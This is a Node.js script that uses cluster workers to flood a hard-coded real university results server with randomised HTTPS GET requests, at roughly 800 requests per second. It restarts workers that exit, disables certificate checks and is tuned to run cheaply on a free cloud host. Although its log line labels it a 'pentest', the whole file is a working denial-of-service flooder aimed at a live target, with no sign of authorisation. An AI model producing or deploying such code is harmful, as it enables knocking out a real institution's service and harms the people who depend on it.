const cluster = require('cluster');
const https = require('https');
const os = require('os');

// 🧠 MEMORY-OPTIMIZED FOR RENDER FREE (target <300MB)
const TARGET_HOST = 'result.isi.ui.edu.ng';
const MAX_RPS_PER_WORKER = 200;  // Ultra-conservative
const THREADS = 4;  // HALVED - memory bottleneck
const BURST_SIZE = 20;      // Tiny bursts
const BURST_INTERVAL = 100; // 200rps/worker

console.log(`🧠 LOW-MEM PENTEST: ${MAX_RPS_PER_WORKER*THREADS}rps x ${THREADS} workers (<300MB)`);

if (cluster.isMaster) {
    for (let i = 0; i < THREADS; i++) cluster.fork();

    cluster.on('exit', (worker) => cluster.fork());
    process.on('SIGTERM', () => process.exit(0));
} else {
    // NO AGENT POOL - single connection reuse only
    let totalRequests = 0;
    let errors = 0;

    const options = {
        hostname: TARGET_HOST,
        port: 443,
        method: 'GET',
        timeout: 2000,  // Faster timeout
        rejectUnauthorized: false,
        headers: {
            'User-Agent': 'Mozilla/5.0 (compatible; Bot)',
            'Accept': '*/*',
            'Connection': 'close'  // NO KEEPALIVE - saves memory
        }
    };

    const makeRequest = () => {
        const path = '/' + Math.random().toString(36).slice(2, 8);
        options.path = path;

        const req = https.request(options, (res) => {
            totalRequests++;
            res.destroy();
        });

        req.on('error', () => errors++);
        req.on('timeout', () => req.destroy());
        req.end();
    };

    // Memory-safe burst (serial-ish)
    const floodBurst = () => {
        let i = 0;
        const burstTimer = setInterval(() => {
            if (i < BURST_SIZE) {
                makeRequest();
                i++;
            } else {
                clearInterval(burstTimer);
            }
        }, 5);  // 5ms spacing = controlled concurrency
    };

    // Slower main loop for memory stability
    setInterval(floodBurst, BURST_INTERVAL);

    // Minimal logging
    setInterval(() => {
        const rps = Math.round(totalRequests / 30);
        process.stdout.write(`W${process.pid}:${totalRequests}(${rps}rps)e${errors} `);
        totalRequests = 0; errors = 0;  // Reset counters
    }, 30000);

    process.on('SIGTERM', () => process.exit(0));
}